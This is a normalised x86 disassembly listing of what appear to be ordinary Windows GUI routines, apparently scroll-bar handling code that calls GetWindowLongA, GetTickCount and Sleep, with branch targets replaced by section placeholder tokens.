mov edx [ r-xdata ]
call sub_4040f0
test al al
jne r-xdata
mov esi [ esi + 0x30 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
pop esi
pop ebx
retn
sub_44e788
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov esi eax
xor eax eax
push ebp
push sub_44e7f9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_44e778
mov ebx eax
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e800
lea eax [ ebp - 0xc ]
call sub_404e44
retn
mov eax [ esi + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbf0
call sub_4047d8
sub_44e808
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403f34
mov [ edi + 0x4 ] esi
movzx eax [ ebp + 0x8 ]
mov [ edi + 0x18 ] al
mov cx 0x50
mov [ edi + 0xa ] cx
movzx eax cx
mov ecx 0xa
xor edx edx
div ecx
mov [ edi + 0x8 ] ax
mov [ edi + 0x1c ] 0x1
mov [ edi + 0x20 ] 0xa
mov [ edi + 0x40 ] 0x4
mov [ edi + 0x3c ] 0xc
mov [ edi + 0x28 ] 0xff000014
mov [ edi + 0x2c ] 0x1
mov [ edi + 0x44 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_44e89c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_416dc8
mov edi esi
movzx edx [ edi + 0x1c ]
mov eax ebx
call sub_44f190
mov edx [ edi + 0x10 ]
mov eax ebx
call sub_44f16c
mov edx [ edi + 0xc ]
mov eax ebx
call sub_44f01c
movzx eax [ edi + 0x8 ]
mov [ ebx + 0x8 ] ax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44e8ec
push ebx
mov ebx eax
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_44eaac
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_43c84c
test al al
jne r-xdata
mov edx [ ebx + 0x10 ]
mov eax ebx
call sub_44f01c
xor edx edx
mov eax ebx
call sub_44f01c
jmp r-xdata
sub_44e924
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
movzx eax [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
cmp [ ebx + 0x5b ] 0x3
je r-xdata
sub al 0x2
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov edx [ edx + 0xc ]
add edx [ ebx + 0x40 ]
add edx [ ebx + 0x48 ]
cmp edx eax
jl r-xdata
movzx eax [ r-xdata ]
and al [ ebx + 0x61 ]
movzx edx [ r-xdata ]
cmp dl al
jne r-xdata
dec al
je r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax edx
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x48 ]
add [ eax - 0xc ] edx
jmp r-xdata
sub_44e994
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
movzx eax [ ebx + 0x5b ]
sub al 0x2
jb r-xdata
cmp [ ebx + 0x5b ] 0x1
je r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov edx [ edx + 0xc ]
add edx [ ebx + 0x44 ]
add edx [ ebx + 0x4c ]
cmp edx eax
jl r-xdata
movzx eax [ r-xdata ]
and al [ ebx + 0x61 ]
movzx edx [ r-xdata ]
cmp dl al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x4c ]
add [ eax - 0xc ] edx
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax edx
sub_44ea00
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov ebx [ eax + 0x4 ]
cmp [ ebx + 0x258 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd8 ]
test al al
je r-xdata
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_44f154
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_43ff78
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x4 ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x1a ]
add edx eax
mov eax [ ebp - 0x8 ]
call sub_44f154
jmp r-xdata
inc ebx
xor esi esi
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_43ff3c
call sub_44e994
pop ecx
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_43ff3c
call sub_44e924
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
inc esi
dec ebx
jne r-xdata
sub_44eaac
push ebx
push esi
mov ebx eax
mov esi 0x100000
cmp [ ebx + 0x18 ] 0x1
jne r-xdata
cmp [ ebx + 0x1c ] 0x0
je r-xdata
mov esi 0x200000
xor eax eax
pop esi
pop ebx
retn
push 0xfffffff0
mov eax [ ebx + 0x4 ]
call sub_443be8
push eax
call GetWindowLongA
test eax esi
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_44eae4
push ebp
mov ebp esp
push ebx
mov ebx 0x100000
cmp ax 0x1
jne r-xdata
push 0xfffffff0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_443be8
push eax
call GetWindowLongA
test eax ebx
setne al
pop ebx
pop ebp
retn
mov ebx 0x200000
sub_44eb18
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5 ] 0x0
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x6 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x6 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_44eae4
pop ecx
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_44eae4
pop ecx
test al al
je r-xdata
movzx eax di
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebp + 0x8 ]
sub ebx [ eax - 0xc ]
neg ebx
jmp r-xdata
movzx eax di
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebp + 0x8 ]
sub ebx [ eax - 0xc ]
sub_44eb94
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
push 0xfffffff0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_443be8
push eax
call GetWindowLongA
test eax 0x840000
setne al
and eax 0x7f
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
push ebp
mov dx 0x14
mov ax 0x1
call sub_44eb18
pop ecx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_43bab4
add ebx eax
mov eax ebx
push ebp
mov dx 0x15
xor eax eax
call sub_44eb18
pop ecx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_43baf8
add ebx eax
mov eax ebx
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_44ec2c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
mov [ ebp - 0x1c ] 0x1c
mov [ ebp - 0x18 ] 0x10
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x8 ]
movsx esi [ esi + 0x6 ]
lea eax [ ebp - 0x1c ]
push eax
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_443be8
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
je r-xdata
mov ebx 0x1
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi [ ebp - 0x4 ]
sub_44ec8c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1f ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
movsx eax [ eax + 0x4 ]
cmp eax 0x7
ja r-xdata
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x4 ]
sub ax 0x4
jae r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ eax * 4 + jump_table_44ee7e ]
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x4 ]
sub ax 0x2
jb r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
sub edx eax
mov eax [ ebp - 0x4 ]
call sub_44f01c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
add edx eax
mov eax [ ebp - 0x4 ]
call sub_44f01c
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_44eb94
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
sub edx eax
mov eax [ ebp - 0x4 ]
call sub_44f01c
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_44eb94
mov edx eax
mov eax [ ebp - 0x4 ]
add edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_44f01c
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x7fff
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1d ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_44f01c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_44f01c
mov eax [ ebp - 0x4 ]
movzx ebx [ eax + 0x8 ]
mov eax ebx
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x40 ]
cdq
idiv ecx
mov [ ebp - 0xc ] eax
mov eax ebx
cdq
idiv ecx
mov [ ebp - 0x10 ] edx
mov edi ecx
jmp r-xdata
sub ax 0x2
jb r-xdata
mov edx [ ebp - 0x8 ]
movsx edx [ edx + 0x6 ]
mov eax [ ebp - 0x4 ]
call sub_44f01c
jmp r-xdata
push ebp
call sub_44ec2c
pop ecx
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_44f01c
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x7fff
jle r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
test edi edi
jle r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0xa ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x3c ]
mov eax [ ebp - 0xc ]
cdq
idiv ebx
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0xc ]
cdq
idiv ebx
mov [ ebp - 0xc ] eax
mov edi ebx
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
movsx edx [ edx + 0x6 ]
mov eax [ ebp - 0x4 ]
call sub_44f01c
jmp r-xdata
push ebp
call sub_44ec2c
pop ecx
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_44f01c
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jle r-xdata
call GetTickCount
mov ebx eax
mov esi ebx
sub esi [ ebp - 0x14 ]
mov eax esi
xor edx edx
push edx
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
cdq
cmp edx [ esp + 0x4 ]
jne r-xdata
xor edi edi
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x4 ]
sub ax 0x1
jb r-xdata
pop edx
pop eax
jle r-xdata
cmp eax [ esp ]
pop edx
pop eax
jbe r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_44f01c
jmp r-xdata
je r-xdata
mov [ ebp - 0x14 ] ebx
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x4 ]
sub ax 0x1
jb r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
sub eax esi
push eax
call Sleep
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_44f01c
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_44f01c
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_44f01c
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x8c ]
dec edi
test edi edi
jg r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_44f01c
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_44f01c
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_44f01c
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_44f01c
jmp r-xdata
sub_44efa4
push ebx
push esi
mov ebx eax
cmp edx [ ebx + 0x24 ]
je r-xdata
pop esi
pop ebx
retn
mov esi edx
test esi esi
jne r-xdata
mov [ ebx + 0x24 ] edx
mov [ ebx + 0x44 ] 0x1
mov eax [ ebx + 0x4 ]
call sub_44f69c
test esi esi
jne r-xdata
movzx eax [ ebx + 0x18 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
xor eax eax
mov [ ebx + 0x24 ] eax
sub_44f01c
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x4 ]
test [ eax + 0x1c ] 0x2
je r-xdata
mov eax [ ebx + 0x14 ]
cmp edx eax
jle r-xdata
mov [ ebx + 0xc ] edx
jmp r-xdata
test edx edx
jge r-xdata
mov edx eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
xor edx edx
mov si 0x1
xor esi esi
jmp r-xdata
movzx edi si
push edi
mov eax [ ebx + 0x4 ]
call sub_443be8
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax [ ebx + 0xc ]
je r-xdata
mov [ ebx + 0xc ] edx
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax [ ebx + 0xc ]
cmp edx eax
je r-xdata
push 0xffffffff
mov eax [ ebx + 0xc ]
push eax
push edi
mov eax [ ebx + 0x4 ]
call sub_443be8
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ecx eax
sub ecx edx
mov eax [ ebx + 0x4 ]
xor edx edx
call sub_443794
sub eax edx
mov edx eax
xor ecx ecx
mov eax [ ebx + 0x4 ]
call sub_443794
jmp r-xdata
xor edx edx
call sub_44e778
test eax eax
je r-xdata
mov eax [ ebx + 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
cmp [ eax + 0x298 ] 0x0
je r-xdata
mov eax [ eax + 0x298 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_44f0e0
push ebx
push esi
mov ebx eax
cmp edx [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
mov esi edx
test esi esi
jne r-xdata
mov [ ebx + 0x30 ] edx
mov [ ebx + 0x44 ] 0x1
mov eax [ ebx + 0x4 ]
call sub_44f69c
test esi esi
jne r-xdata
movzx eax [ ebx + 0x18 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
xor eax eax
mov [ ebx + 0x30 ] eax
sub_44f19c
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov esi [ ebp + 0x8 ]
add esi 0xfffffffc
cmp bl 0x1
cmc
sbb eax eax
push eax
mov eax [ esi ]
movzx eax [ eax + 0x34 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_443be8
push eax
call sub_42eb80
mov eax [ esi ]
cmp [ eax + 0x24 ] 0x0
jle r-xdata
mov eax [ esi ]
cmp [ eax + 0x38 ] 0x0
jle r-xdata
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x24 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_443be8
push eax
call sub_42eb80
mov eax [ esi ]
cmp [ eax + 0x30 ] 0x0
jle r-xdata
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_443be8
push eax
call sub_42eb80
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x28 ]
call sub_423140
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_443be8
push eax
call sub_42eb80
pop esi
pop ebx
pop ebp
retn
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_443be8
push eax
call sub_42eb80
sub_44f2a4
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
lea esi [ ebp - 0x4 ]
mov eax [ esi ]
xor edx edx
mov [ eax + 0x14 ] edx
xor ebx ebx
mov eax [ esi ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ esi ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov bx 0x1
mov [ ebp - 0x22 ] 0x1c
mov [ ebp - 0x1e ] 0x17
xor eax eax
mov [ ebp - 0x1a ] eax
mov eax [ esi ]
cmp [ eax + 0x14 ] 0x0
jle r-xdata
movzx ecx [ ebp - 0x6 ]
movzx edx [ ebp - 0x5 ]
mov eax [ esi ]
call sub_44eb94
mov edx [ esi ]
mov edi [ edx + 0x10 ]
sub edi eax
mov eax [ esi ]
mov [ eax + 0x14 ] edi
test edi edi
jge r-xdata
xor eax eax
mov [ ebp - 0x16 ] eax
mov eax [ esi ]
mov eax [ eax + 0x10 ]
mov [ ebp - 0x16 ] eax
jmp r-xdata
mov eax [ esi ]
xor edx edx
mov [ eax + 0x14 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
movzx eax bx
mov ecx 0xa
xor edx edx
div ecx
mov edx [ esi ]
mov [ edx + 0x8 ] ax
movzx ecx [ ebp - 0x6 ]
movzx edx [ ebp - 0x5 ]
mov eax [ esi ]
call sub_44eb94
inc eax
mov [ ebp - 0x12 ] eax
mov eax [ esi ]
mov eax [ eax + 0xc ]
mov [ ebp - 0xe ] eax
mov [ ebp - 0xa ] eax
push ebp
mov eax [ esi ]
movzx eax [ eax + 0x44 ]
call sub_44f19c
pop ecx
mov eax [ esi ]
mov [ eax + 0x44 ] 0x0
push 0xffffffff
lea eax [ ebp - 0x22 ]
push eax
movzx eax bx
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_443be8
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ esi ]
mov edx [ eax + 0xc ]
mov eax [ esi ]
call sub_44f01c
xor ecx ecx
mov dl 0x1
mov eax [ esi ]
call sub_44eb94
lea eax [ eax + eax * 8 ]
mov ecx 0xa
cdq
idiv ecx
mov ebx eax
mov eax [ esi ]
mov [ eax + 0xa ] bx
mov eax [ esi ]
cmp [ eax + 0x1f ] 0x0
je r-xdata
sub_44f3c0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_43edc4
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_44e808
mov [ esi + 0x250 ] eax
push 0x1
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_44e808
mov [ esi + 0x254 ] eax
mov [ esi + 0x258 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax esi
pop esi
pop ebx
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_44f438
push ebx
push esi
call sub_404330
mov ebx edx
mov esi eax
mov eax [ esi + 0x250 ]
call sub_403f64
mov eax [ esi + 0x254 ]
call sub_403f64
mov edx ebx
and dl 0xfc
mov eax esi
call sub_43ef08
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4042d8
sub_44f484
push ebx
mov ebx eax
mov eax ebx
call sub_440230
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
mov eax ebx
call sub_44f69c
pop ebx
retn
mov edx 0x1
mov eax 0x5
call sub_40e3dc
test al al
jne r-xdata
mov eax ebx
call sub_443be8
push eax
call sub_42ebb4
sub_44f4c4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_44f61c
mov ecx edi
mov edx esi
mov eax ebx
call sub_43f8fc
pop edi
pop esi
pop ebx
retn
sub_44f504
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44f60c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_43bab4
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x250 ]
mov eax ebx
call sub_44eaac
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x10 ]
cmp eax [ ebp - 0x8 ]
jg r-xdata
mov [ ebp - 0x9 ] al
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
call sub_43ff78
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x8 ] eax
xor edx edx
mov eax ebx
call sub_44f01c
mov eax [ ebp - 0x10 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor ebx ebx
cmp [ ebp - 0x9 ] 0x0
je r-xdata
inc esi
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43ff3c
mov edi eax
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43ff3c
mov edx eax
mov eax [ ebp - 0x10 ]
call sub_416668
mov edx [ ebp - 0x8 ]
sub edx [ edi + 0x48 ]
sub edx [ edi + 0x40 ]
mov eax edi
call sub_43b7c8
inc ebx
dec esi
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f613
mov eax [ ebp - 0x10 ]
call sub_403f64
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
call sub_44e8ec
push 0x0
mov edx ebx
mov eax [ ebp - 0x10 ]
call sub_4167c8
xor ecx ecx
mov edx 0xb03e
call sub_43d400
inc ebx
dec esi
jne r-xdata
sub_44f640
push ebx
mov ebx eax
cmp dl [ ebx + 0x258 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x258 ] dl
test dl dl
je r-xdata
xor edx edx
mov eax [ ebx + 0x250 ]
call sub_44f16c
xor edx edx
mov eax [ ebx + 0x254 ]
call sub_44f16c
mov eax ebx
call sub_44f61c
jmp r-xdata
sub_44f69c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x260 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_443f88
test al al
je r-xdata
xor eax eax
push ebp
push sub_44f787
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x260 ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
call sub_44ec14
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
call sub_44ec14
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
mov cl 0x1
xor edx edx
call sub_44f2a4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
xor ecx ecx
mov dl 0x1
call sub_44f2a4
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
xor ecx ecx
xor edx edx
call sub_44f2a4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
xor ecx ecx
mov dl 0x1
call sub_44f2a4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
mov cl 0x1
xor edx edx
call sub_44f2a4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
xor ecx ecx
mov dl 0x1
call sub_44f2a4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x260 ] 0x0
retn
sub_44f7ac
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov esi edx
mov ebx eax
mov edi esp
test esi esi
je r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x250 ]
movzx eax [ eax + 0x1a ]
sub [ edi ] eax
add [ edi + 0x8 ] eax
mov eax [ ebx + 0x254 ]
movzx eax [ eax + 0x1a ]
sub [ edi + 0x4 ] eax
add [ edi + 0xc ] eax
lea ecx [ esp + 0x18 ]
mov edx edi
mov eax esi
call sub_43bbc8
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax ebx
call sub_43bc78
mov eax [ esp + 0x10 ]
mov [ edi ] eax
mov eax [ esp + 0x14 ]
mov [ edi + 0x4 ] eax
lea ecx [ esp + 0x18 ]
lea edx [ edi + 0x8 ]
mov eax esi
call sub_43bbc8
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax ebx
call sub_43bc78
mov eax [ esp + 0x10 ]
mov [ edi + 0x8 ] eax
mov eax [ esp + 0x14 ]
mov [ edi + 0xc ] eax
mov esi [ edi ]
test esi esi
jge r-xdata
mov eax ebx
call sub_43bab4
mov ebp [ edi + 0x8 ]
cmp eax ebp
jge r-xdata
mov eax [ ebx + 0x250 ]
